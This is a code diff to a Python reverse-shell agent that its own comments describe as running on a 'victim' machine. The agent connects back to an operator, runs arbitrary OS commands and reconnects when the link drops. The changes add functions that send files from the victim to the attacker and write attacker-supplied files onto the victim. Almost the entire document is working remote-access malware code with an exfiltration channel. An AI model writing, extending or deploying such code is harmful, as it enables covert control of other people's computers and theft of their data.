@@ -7,6 +7,9 @@ This module runs on the target (victim) machine, establishes a reverse
 TCP connection to the handler, and enters a receive loop — executing
 OS commands via subprocess and returning results to the operator.
 
+Supports file download (victim → attacker) and file upload
+(attacker → victim) via a size-prefixed binary transfer protocol.
+
 If the connection is lost or the listener is unavailable, the agent
 automatically retries at a configurable interval until the operator
 explicitly sends the 'exit' command or the process is interrupted.
@@ -25,6 +28,7 @@ import time
 # ---------------------------------------------------------------------------
 BUFFER_SIZE = 4096       # Max bytes to receive per recv() call
 RECONNECT_DELAY = 5      # Seconds to wait between reconnection attempts
+HEADER_SIZE = 16         # Fixed-length header carrying the file size
 
 # ---------------------------------------------------------------------------
 # Logger configuration
@@ -196,6 +200,139 @@ class Agent:
             return msg
 
     # ------------------------------------------------------------------
+    # Network helpers
+    # ------------------------------------------------------------------
+
+    def _recv_exact(self, length: int) -> bytes:
+        """
+        Receive exactly *length* bytes from the socket.
+
+        TCP is a stream protocol so a single recv() may return fewer
+        bytes than requested.  This loops until the full payload arrives.
+
+        Args:
+            length: Number of bytes to receive.
+
+        Returns:
+            Complete byte string of the requested length.
+
+        Raises:
+            ConnectionError: If the peer disconnects prematurely.
+        """
+        data = b""
+        while len(data) < length:
+            chunk = self.sock.recv(min(BUFFER_SIZE, length - len(data)))
+            if not chunk:
+                raise ConnectionError("Connection closed during transfer.")
+            data += chunk
+        return data
+
+    # ------------------------------------------------------------------
+    # File transfer handlers
+    # ------------------------------------------------------------------
+
+    def _handle_download(self, file_path: str) -> None:
+        """
+        Send a local file to the listener (victim → attacker).
+
+        Protocol:
+            1. Agent receives ``download <path>`` (already parsed).
+            2. Agent sends a 16-byte size header with the file size.
+               - On error: sends ``ERROR:<err_len>`` header followed by
+                 the error message.
+            3. Agent streams the file data in BUFFER_SIZE chunks.
+
+        Args:
+            file_path: Absolute or relative path on the agent's filesystem.
+        """
+        try:
+            with open(file_path, "rb") as fp:
+                file_data = fp.read()
+        except FileNotFoundError:
+            self._send_file_error(f"[!] File not found: {file_path}")
+            return
+        except PermissionError:
+            self._send_file_error(f"[!] Permission denied: {file_path}")
+            return
+        except OSError as exc:
+            self._send_file_error(f"[!] Cannot read file: {exc}")
+            return
+
+        file_size = len(file_data)
+        header = str(file_size).zfill(HEADER_SIZE).encode("utf-8")
+
+        try:
+            self.sock.sendall(header)
+            for offset in range(0, file_size, BUFFER_SIZE):
+                self.sock.sendall(file_data[offset:offset + BUFFER_SIZE])
+            logger.info("Sent file %s (%d bytes).", file_path, file_size)
+        except (BrokenPipeError, ConnectionResetError, OSError) as exc:
+            logger.error("Failed to send file — %s", exc)
+
+    def _send_file_error(self, message: str) -> None:
+        """
+        Send an error header + message to the listener so it knows the
+        file transfer cannot proceed.
+
+        Format: ``ERROR:<message_length>`` (16 bytes) + message bytes.
+
+        Args:
+            message: Human-readable error description.
+        """
+        encoded = message.encode("utf-8")
+        err_header = f"ERROR:{len(encoded)}".ljust(HEADER_SIZE).encode("utf-8")
+        try:
+            self.sock.sendall(err_header + encoded)
+            logger.debug("Sent file error: %s", message)
+        except OSError:
+            pass
+
+    def _handle_upload(self, command: str) -> None:
+        """
+        Receive a file from the listener (attacker → victim).
+
+        Protocol:
+            1. Agent receives ``upload <path>``.
+            2. Agent sends ``READY`` acknowledgement.
+            3. Listener sends a 16-byte size header + file data.
+            4. Agent writes the data to a local file and sends
+               a confirmation message back.
+
+        Args:
+            command: The full ``upload <path>`` command string.
+        """
+        # Extract the desired filename from the remote path.
+        remote_path = command.split(" ", 1)[1].strip()
+        local_name = os.path.basename(remote_path)
+
+        try:
+            # Signal readiness to the listener.
+            self.sock.sendall(b"READY")
+
+            # --- Receive size header ---
+            header = self._recv_exact(HEADER_SIZE)
+            header_str = header.decode("utf-8").strip()
+            file_size = int(header_str)
+
+            # --- Receive file data ---
+            file_data = self._recv_exact(file_size)
+
+            with open(local_name, "wb") as fp:
+                fp.write(file_data)
+
+            confirm = (
+                f"[+] Upload received: '{local_name}' "
+                f"({file_size:,} bytes)"
+            )
+            self.sock.sendall(confirm.encode("utf-8"))
+            logger.info(
+                "Received upload %s (%d bytes).", local_name, file_size
+            )
+
+        except (ConnectionError, ValueError, OSError) as exc:
+            logger.error("Upload receive failed — %s", exc)
+
+    # ------------------------------------------------------------------
     # Interactive receive loop
     # ------------------------------------------------------------------
 
@@ -205,9 +342,11 @@ class Agent:
         execute them on the host operating system, and send results back.
 
         Behaviour:
-            - 'exit'  → break out of the loop and shut down.
-            - 'cd ..' → handled via os.chdir() for persistent effect.
-            - Others  → executed via subprocess; output returned.
+            - 'exit'            → shut down permanently.
+            - 'cd <path>'       → persistent directory change.
+            - 'download <path>' → send file to listener.
+            - 'upload <path>'   → receive file from listener.
+            - Others            → executed via subprocess.
         """
         logger.info("Entered receive loop — waiting for commands.")
 
@@ -233,6 +372,18 @@ class Agent:
                 if command.lower() == "cd" or command.lower().startswith("cd "):
                     path = command[3:].strip()
                     response = self._handle_cd(path)
+
+                # Handle file download (agent → listener).
+                elif command.lower().startswith("download "):
+                    file_path = command.split(" ", 1)[1].strip()
+                    self._handle_download(file_path)
+                    continue
+
+                # Handle file upload (listener → agent).
+                elif command.lower().startswith("upload "):
+                    self._handle_upload(command)
+                    continue
+
                 else:
                     response = self._execute_command(command)
 
